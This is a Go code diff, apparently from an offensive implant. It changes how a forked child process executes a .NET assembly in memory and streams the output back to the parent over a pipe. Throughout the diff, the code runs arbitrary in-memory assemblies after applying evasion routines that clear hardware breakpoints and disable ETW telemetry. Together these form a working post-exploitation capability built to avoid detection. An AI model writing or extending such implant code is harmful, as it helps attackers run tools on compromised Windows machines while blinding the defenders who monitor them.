@@ -134,9 +134,12 @@ func forkRunAssembly(asmBytes []byte, args string) (string, error) {
 }
 
 // clrChildRun is called in the child process when clrChildEnvKey is set.
-// Reads the assembly + args from stdin, runs in-process CLR, prints output.
+// Reads assembly + args from stdin, then executes the CLR writing output
+// DIRECTLY to stdout (the pipe back to the parent) via executeInMemory.
+//
+// Writing directly to the pipe (not a temp file) ensures the parent receives
+// all output even when the assembly calls Environment.Exit() before returning.
 func clrChildRun() {
-	// Apply evasion so the assembly runs in a clean environment.
 	if EvasionPatches != "false" {
 		clearHardwareBreakpoints()
 		disableETWProcess()
@@ -149,7 +152,6 @@ func clrChildRun() {
 
 	rd := os.Stdin
 	hdr := make([]byte, 4)
-
 	if _, err := io.ReadFull(rd, hdr); err != nil {
 		os.Exit(1)
 	}
@@ -169,11 +171,31 @@ func clrChildRun() {
 		os.Exit(1)
 	}
 
-	out, _ := ExecuteAssembly(asmBytes, args, "", "")
-	fmt.Print(out)
-	// os.Exit is NOT called here — if the assembly called Environment.Exit(),
-	// the process already exited above. If we reach this point the assembly
-	// returned normally and stdout is flushed on process exit.
+	// Bootstrap CLR.
+	_, pRuntimeInfo, err := bootstrapCLR()
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[!] CLR bootstrap: %v\n", err)
+		os.Exit(1)
+	}
+
+	// Get the child's stdout handle — this IS the pipe back to the parent.
+	// Passing it as wPipe causes executeInMemory to point Console.SetOut at
+	// the pipe via ConsoleReset, so all assembly output flows directly to the
+	// parent in real-time. If the assembly calls Environment.Exit(), the OS
+	// closes the pipe write-end and the parent's ReadFile returns with the
+	// bytes already written — nothing is lost in a temp file.
+	stdH, _, _ := procGetStdHandle.Call(stdOutputHandle)
+	pipeH := windows.Handle(stdH)
+
+	progress := make(chan string, 32)
+	go func() {
+		for range progress {
+		}
+	}()
+
+	executeInMemory(pRuntimeInfo, asmBytes, args, progress, pipeH) //nolint:errcheck
+	// Output was streamed to pipeH. No fmt.Print needed.
+	// If assembly called Environment.Exit() we never reach here — that's fine.
 }
 
 // clrBuildEnvBlock builds a double-null-terminated UTF-16 environment block
